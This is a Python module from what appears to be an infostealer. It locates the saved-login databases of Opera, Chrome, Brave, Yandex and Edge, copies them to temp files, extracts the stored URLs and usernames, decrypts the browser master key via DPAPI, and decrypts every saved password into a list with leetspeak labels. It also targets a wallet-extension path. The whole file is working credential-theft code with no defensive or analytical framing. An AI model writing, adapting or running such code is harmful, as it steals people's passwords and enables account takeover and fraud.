from helpers.helpers import HelpersSilentScript

import os
import random
import shutil
from sqlite3 import connect
from base64 import b64decode
from json import loads

class Browser:    
    def __init__(self):
        self.roaming = os.getenv('APPDATA')
        self.local = os.getenv('LOCALAPPDATA')
        self.temp = os.getenv("TEMP")
        self.Passw = []
        self.main()
    
    
    def main(self):
        browserPaths = [
            [f"{self.roaming}/Opera Software/Opera GX Stable",               "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
            [f"{self.roaming}/Opera Software/Opera Stable",                  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
            [f"{self.roaming}/Opera Software/Opera Neon/User Data/Default",  "opera.exe",    "/Local Storage/leveldb",           "/",            "/Network",             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"                      ],
            [f"{self.local}/Google/Chrome/User Data",                        "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
            [f"{self.local}/Google/Chrome SxS/User Data",                    "chrome.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
            [f"{self.local}/BraveSoftware/Brave-Browser/User Data",          "brave.exe",    "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ],
            [f"{self.local}/Yandex/YandexBrowser/User Data",                 "yandex.exe",   "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"                                    ],
            [f"{self.local}/Microsoft/Edge/User Data",                       "edge.exe",     "/Default/Local Storage/leveldb",   "/Default",     "/Default/Network",     "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"              ]
        ]
        
        for paths in browserPaths:
            self.getPassw(paths[0], paths[3])   
            
        return self.Passw
       
    def getPassw(self, path, arg):
        if not os.path.exists(path): return
        pathC = path + arg + "/Login Data"
        if os.stat(pathC).st_size == 0: return
        tempfold = self.temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
        shutil.copy2(pathC, tempfold)
        conn = connect(tempfold)
        cursor = conn.cursor()
        cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
        data = cursor.fetchall()
        cursor.close()
        conn.close()
        os.remove(tempfold)

        pathKey = path + "/Local State"
        with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = HelpersSilentScript.CryptUnprotectData(master_key[5:])

        for row in data:
            if row[0] != '':
                self.Passw.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {HelpersSilentScript.DecryptValue(row[2], master_key)}")